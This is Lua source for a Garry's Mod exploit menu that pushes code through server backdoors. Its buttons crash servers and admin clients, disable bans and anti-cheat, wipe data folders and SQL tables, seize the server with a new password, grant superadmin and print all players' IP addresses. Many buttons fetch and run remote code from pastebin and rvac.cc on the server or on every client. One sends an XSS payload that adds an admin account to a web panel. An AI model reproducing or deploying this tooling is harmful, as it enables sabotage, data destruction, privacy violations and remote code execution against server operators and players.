    a[_.l]("Crash Server", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[timer.Create("rekt",0.5,1,function() while true do end end)]]
        chat[_.a](Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "The server has been crashed gg")
    end)

    a[_.l]("Crash Admins & Vip's", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]"for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"user\" ) then v:SendLua(\"while true do end\") end end"
    end)

    a[_.l]("Change Everyone Name", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Set Everyones Name", "Name", "", function(c)
            e[_.m]([[local str = "]] .. c .. [["

	for k, v in next, player.GetAll() do

	DarkRP.storeRPName( v, str )

	v:setDarkRPVar( "rpname", str )

	end]])
        end)
    end)

    a[_.l]("Change Everyone Model", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Change Everyones Model", "Model Directory", "", function(c)
            e[_.m]("for k, v in pairs(player.GetAll()) do v:SetModel(\"" .. c .. "\") end")
        end)
    end)

    a[_.l]("Change Everything Material", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Set Everythings Material", "Material Directory", "", function(c)
            e[_.m]("for k, v in pairs(ents.GetAll()) do v:SetMaterial(\"" .. c .. "\") end")
        end)
    end)

    a[_.l]("Disable Bans/Kicks", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if ULib then

	function ULib.kick( ply, reason, calling_ply ) end

	function ULib.ban( ply, time, reason, admin ) end

	function ULib.addBan( steamid, time, reason, name, admin ) end

	end

	if FAdmin then

	local function no(ply) end

	FAdmin.Commands.AddCommand("kick", no)

	FAdmin.Commands.AddCommand("ban", no)

	FAdmin.Commands.AddCommand("jail", no)

	FAdmin.Commands.AddCommand("UnJail", no)

	FAdmin.Commands.AddCommand("ClearDecals", no)

	FAdmin.Commands.AddCommand("StopSounds", no)

	FAdmin.Commands.AddCommand("CleanUp", no)

	end

	local _R = debug.getregistry()

	function _R.Player.Ban(ply, r) end

	function _R.Player.Kick(ply, r) end

	function game.KickID(id, reason) end

	local RCM = RunConsoleCommand

	function RunConsoleCommand(command, ...)

	if command == "addip" then return end

	RCM(command, ...)

	end]]
    end)

    a[_.l]("Disable SNTE", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[

	local function Check(func)

	if string.find(debug.getinfo(func).short_src,"snte_source.lua") then

	return true

	else

	return false

	end

	end

	timer.Create("rvacbypass",5,0,function()

	for k,v in pairs(net.Receivers) do

	if Check(v) then

	net.Receive(k,function(l,ply)

	ply:ChatPrint("LEL")

	end)

	end

	end


	end)]]
    end)

    a[_.l]("Disable Exit", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[hook.Add("Think","iuefheqefq",function() gui.HideGameUI() end)]]
    end)

    a[_.l]("Delete Server", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[local function WipeDir(dir)

	local files,dirs = file.Find(dir.."*", "DATA")

	for k,v in ipairs(files) do

	file.Delete(dir..v)

	end

	for k,v in ipairs(dirs) do

	WipeDir(v.."/")

	end

	end

	print(60*60*6)

	local function wiperpro()

	print("Wiping server data. . .")

	WipeDir("")

	sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")

	if ULib then

	for k,v in pairs(ULib.ucl.groups) do

	if k != "user" then

	ULib.ucl.removeGroup(k)

	end

	end

	end

	if FPP then

	for k,v in pairs(FPP.Blocked) do

	for r,g in pairs(v) do

	RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)

	end

	end

	end

	for i=1,256 do

	RunConsoleCommand("removeid",i)

	end

	for k,v in ipairs(player.GetAll()) do

	v:Kick("rvac.Team")

	end

	print("Wipe finished !")

	end

	timer.Create("1Tap",0.5,1,function() while true do end end)

	wiperpro()]]
    end)

    a[_.l]("Earthquake", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !timer.Exists("earthquake") then

	timer.Create("earthquake", 0.5, 500, function()

	for _, p in pairs(player.GetAll()) do

	p:SetPos(p:GetPos() + Vector(0, 0, 1))

	p:SetVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150)))

	util.ScreenShake(p:GetPos(), 20, 1, 1, 100)

	p:EmitSound("ambient/explosions/exp1.wav", 100, math.random(60, 100))

	end

	for _, e in pairs(ents.GetAll()) do

	if e:GetPhysicsObject() and e:GetPhysicsObject():IsValid() then e:GetPhysicsObject():AddVelocity(Vector(math.random(-50, 50), math.random(-50, 50), math.random(100, 150))) end

	end

	end)

	else

	timer.Remove("earthquake")

	end]]
    end)

    a[_.l]("EarRape", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]"for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end"
    end)

    a[_.l]("Force Dance All", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )]]
    end)

    a[_.l]("Ignite Everyone", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Ignite All Players", "Lenght In Seconds", "", function(c)
            e[_.m]("for k, v in pairs(player.GetAll()) do v:Ignite(" .. c .. ") end")
        end)
    end)

    a[_.l]("Kill Everyone", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]"for k,v in pairs(player.GetAll()) do v:Kill() end"
    end)

    a[_.l]("Luarun Access", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[RunConsoleCommand("ulx", "groupallow", "user", "ulx luarun")]]
    end)

    a[_.l]("Launch Players", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]"for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end"
    end)

    a[_.l]("LuaRun Code", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("LuaRun String", "String", "", function(c)
            e[_.m]([[RunString( ']] .. c .. [[' )]])
        end)
    end)

    a[_.l]("Rainbow Physgun", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[hook.Add("Think", "rainbowphysgun", function()

	for k,ply in ipairs(player.GetAll()) do

	local col = HSVToColor(CurTime() % 6 * 60, 1, 1)

	ply:SetWeaponColor(Vector(col.r / 255, col.g / 255, col.b / 255))

	end

	end)]]
    end)

    a[_.l]("Rainbow Chat Spam", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Rainbow Chatspam", "Text", "", function(c)
            e[_.m]([[

	chat = {}

	function chat.AddText(...)

	net.Start("rvac")

	net.WriteTable({...})

	net.Broadcast()

	end

	function AddTextPly(ply, ...)

	net.Start("rvac")

	net.WriteTable({...})

	net.Send(ply)

	end

	for k, v in pairs(player.GetAll()) do

	v:SendLua('net.Receive("rvac", function(len) chat.AddText(unpack(net.ReadTable()))end)')

	end

	timer.Create("gotEm", 0.8, 120, function()

	local function ChatPrintRainbow(frequency, str)

	local text = {}

	for i = 1, #str do

	table.insert(text, HSVToColor(i * frequency % 360, 1, 1))

	table.insert(text, string.sub(str, i, i))

	end

	chat.AddText(unpack(text))

	end

	ChatPrintRainbow(10, "]] .. c .. [[")

	end)]])
        end)
    end)

    a[_.l]("Rainbow HUD", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !rainbowscreen then

	BroadcastLua("hook.Add('HUDPaint', 'rainbowscreen', function() local cin = math.sin(CurTime() * 10) * 255 surface.SetDrawColor(Color(cin, -cin, cin, 100)) surface.DrawRect(0, 0, ScrW(), ScrH()) end)")

	rainbowscreen = true

	else

	BroadcastLua("hook.Remove('HUDPaint', 'rainbowscreen')")

	rainbowscreen = false

	end]]
    end)

    a[_.l]("Rainbow Buildings/Floor", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[BroadcastLua("http.Fetch('https://pastebin.com/raw/gCG1pSNK',function(b,l,h,c)RunString(b)end,nil)")]]
        chat[_.a](Color(255, 0, 0), "[REBUG] ", Color(255, 155, 155), "This may cause frame drop")
    end)

    a[_.l]("Remove Bans", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if file.Exists("ulib/bans.txt", "DATA") then file.Delete("ulib/bans.txt") end]]
    end)

    a[_.l]("Rave Music", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]"BroadcastLua([[surface.PlaySound('music/hl1_song25_remix3.mp3')]])"
    end)

    a[_.l]("Reset all money", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[RunConsoleCommand("rp_resetallmoney")]]
    end)

    a[_.l]("RCON Command", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("RCON Command", "Rcon", "", function(c)
            e.PostRcon(c)
        end)
    end)

    a[_.l]("Server Nuke (M9K)", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[

	local rocket = ents.Create("m9k_launched_davycrockett")

	local ply2 = player.GetAll(]] .. h .. [[)
	
	rocket:SetPos(ply2:GetPos())

	rocket:SetOwner(ply2)

	rocket.Owner = ply2

	rocket:Spawn()

	rocket:Activate()]])
    end)

    a[_.l]("Seize Server", d, function()
        surface[_._]"buttons/button18.wav"
        chat[_.a](Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "Server Password is: GmodCheaTz")
        e[_.m][[RunConsoleCommand("sv_password", "GmodCheaTz")

	RunConsoleCommand("hostname", "SEIZED BY rvac.TEAM")]]
    end)

    a[_.l]("Moan Steps", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if !moanstep then

	hook.Add("PlayerFootstep", "oooh", function(ply)

	ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))

	end)

	moanstep = true

	else

	hook.Remove("PlayerFootstep", "oooh")

	moanstep = false

	end]]
    end)

    a[_.l]("Open URL On Players", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("URL On Players", "URL Link", "", function(c)
            e[_.m][==[local ply = str

	ply:SendLua([[h=vgui.Create("DHTML")

	h:SetSize(ScrW(),ScrH())

	h:OpenURL(..str..)]])

	]==]
        end)
    end)

    a[_.l]("Explode all vehicles", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[for k, v in pairs(ents.GetAll()) do if v:IsVehicle() then

	local explo = ents.Create("env_explosion")

	explo:SetPos(v:GetPos())

	explo:SetKeyValue("iMagnitude", "300")

	explo:Spawn()

	explo:Activate()

	explo:Fire("Explode", "", 0)

	end

	end]]
    end)

    a[_.l]("Print All IP's", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[

	local id = ]] .. LocalPlayer():UserID() .. [[

	for k, v in pairs( player.GetAll() ) do 

	Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )

	end]])
    end)

    a[_.l]("Toggle all doors", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("toggle", "", 0) end end]]
    end)

    a[_.l]("Lock all doors", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("lock", "", 0) end end]]
    end)

    a[_.l]("Unlock all doors", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[local doors = {"func_door", "func_door_rotating", "prop_door_rotating", "prop_dynamic"} for k, v in pairs(ents.GetAll()) do if table.HasValue(doors, v:GetClass()) then v:Fire("unlock", "", 0) end end]]
    end)

    a[_.l]("Vaporize all players", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[for k, v in pairs(player.GetAll()) do v:Remove() end]]
    end)

    a[_.l]("FPP Unrestrict everything", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[if FPP then

	for k,v in pairs(FPP.Blocked) do

	for r,g in pairs(v) do

	RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)

	end

	end

	end]]
    end)

    a[_.l]("Wipe data folder", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[local files, directories = file.Find("*", "DATA") for k, v in pairs(files) do file.Delete(v) end]]
    end)

    a[_.l]("Wipe SQL Tables", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[MySQLite.query ('DROP TABLE darkrp_player' MySQLite.query('CREATE TABLE IF NOT EXISTS darkrp_player(idx INTEGER NOT NULL)')]]
    end)

    a[_.l]("Play Sound From URL", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("Play Sound", "Set Link (Has to end with .AUDIOFORMAT)", "", function(c)
            e[_.m]("BroadcastLua([[sound.PlayURL(\"" .. c .. "\" , \"mono\", function() end)]])")
        end)
    end)

    a[_.l]("Luarun From Google", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("RunLua", "Place google link inside box", "", function(c)
            e[_.m]("http.Fetch(\"" .. c .. "\", function( b, l, h, c ) RunString( b ) end, function() end )")
        end)
    end)

    a[_.l]("Luarun From Pastebin", d, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]("http.Fetch(\"" .. str .. "\", function( b, l, h, c ) RunString( b ) end, function() end )")
    end)

    a[_.l]("ULX Unban SteamID", d, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("ULX Unban SteamID", "SteamID", "", function(c)
            e[_.m][[local gae = ulx_logecho game.ConsoleCommand("ulx_logecho 0" .. "\n") game.ConsoleCommand("ulx unban " ..str.. "\n") game.ConsoleCommand("ulx_logecho " .. gae .. "\n")]]
        end)
    end)

    a[_.l]("Co Host Menu", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[Player(]] .. h .. [[):SendLua('http.Fetch("https://rvac.cc/load/menu.lua",function(b) RunString(b)end)')]])
        chat[_.a](Color(255, 0, 0), "[REBUG] ", Color(20, 150, 200), "Send login key '9HET-IH71-XDF4-V01D'")
    end)

    a[_.l]("Set Superadmin", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[Player(]] .. h .. [[):SetUserGroup("superadmin")]])
    end)

    a[_.l]("Remove User", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[Player(]] .. h .. [[):SetUserGroup("user"))]])
    end)

    a[_.l]("Remove Props", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[game.CleanUpMap(]] .. h .. [[)]])
    end)

    a[_.l]("Enable Godmode", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[Player(]] .. h .. [[):GodEnable()]])
    end)

    a[_.l]("Disable Godmode", g, function()
        surface[_._]"buttons/button18.wav"
        e[_.m]([[Player(]] .. h .. [[):GodDisable()]])
    end)

    a[_.l]("Scan Backdoors", k, function()
        surface[_._]"buttons/button18.wav"
        CheckBackdoors()
    end)

    a[_.l]("GBackdoor Exploit", k, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("GBacdoor Exploit", "LINK/core/stage2.php", "", function(c)
            timer[_.e]('13134657', 5, 0, function()
                http.Post("" .. c, {
                    nb = 27,
                    i = math.random(1, 99999) .. '.' .. math.random(1, 99999) .. '.' .. math.random(1, 99999),
                    n = math.random(1, 99999) .. ':' .. math.random(1, 99999) .. [[<script>$.ajax({url: 'core/ajax/add-user.php?username=support&password=support&cpassword=support'});</script>]]
                })
            end)
        end)
    end)

    a[_.l]("CodeFodder Exploit", k, function()
        surface[_._]"buttons/button18.wav"

        Derma_StringRequest("CodeFodder Exploit", "Download ID", "", function(c)
            timer[_.e]("omgstopit", 0.1, 0, function()
                http.Fetch("https://api.codefodder.store/download/" .. c)
            end)
        end)
    end)

    a[_.l]("Rainbow physgun", k, function()
        surface[_._]"buttons/button18.wav"

        hook.Add("Think", "rainbowphysgun", function()
            for c, d in ipairs(player.GetAll()) do
                local c = HSVToColor(CurTime() % 6 * 60, 1, 1)
                d:SetWeaponColor(Vector(c.r / 255, c.g / 255, c.b / 255))
            end
        end)
    end)

    a[_.l]("Bunny Hop", k, function()
        surface[_._]"buttons/button18.wav"

        if hook.GetTable()["VOIDZZ"] then
            hook.Remove"VOIDZZ"
        end

        local function c(c)
            if c:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround() then
                c:RemoveKey(IN_JUMP)

                if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
                    if c:GetMouseX() > 1 or c:GetMouseX() < -1 then
                        c:SetSideMove(c:GetMouseX() > 1 and 400 or -400)
                    else
                        c:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
                        c:SetSideMove(((c:CommandNumber() % 2 == 0)) and -400 or 400)
                    end
                end
            elseif c:KeyDown(IN_JUMP) then
                c:SetForwardMove(10000)
            end
        end

        hook.Add("CreateMove", "VOIDZZ", function(d)
            c(d)	// <CodeVoid>
        end)
    end)

    a[_.l]("Enigma Disco", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[http.Fetch("https://rvac.cc/load/b1g.lua", function(b) RunString(b) end )]]
    end)

    a[_.l]("Enigma Disco 2.0", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[http.Fetch("https://rvac.cc/load/xd.lua", function(b) RunString(b) end )]]
    end)

    a[_.l]("Hell Mode", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[BroadcastLua("http.Fetch('https://pastebin.com/raw/21tkfuM1',function(b,l,h,c)RunString(b)end,nil)")]]
    end)

    a[_.l]("Music Earth", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[http.Fetch('https://pastebin.com/raw/u67AK6SX',function(b,l,h,c)RunString(b)end,nil)]]
    end)

    a[_.l]("Music DajaVu", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[http.Fetch('https://pastebin.com/raw/iNBkxFiZ',function(b,l,h,c)RunString(b)end,nil)]]
    end)

    a[_.l]("Music Break Bot", k, function()
        surface[_._]"buttons/button18.wav"
        e[_.m][[http.Fetch('https://pastebin.com/raw/rxMQUFMa',function(b,l,h,c)RunString(b)end,nil)]]
    end)

    function CloseMenu()
        f = not 1
        c:Close()
    end
end

a.voidz(not not 1)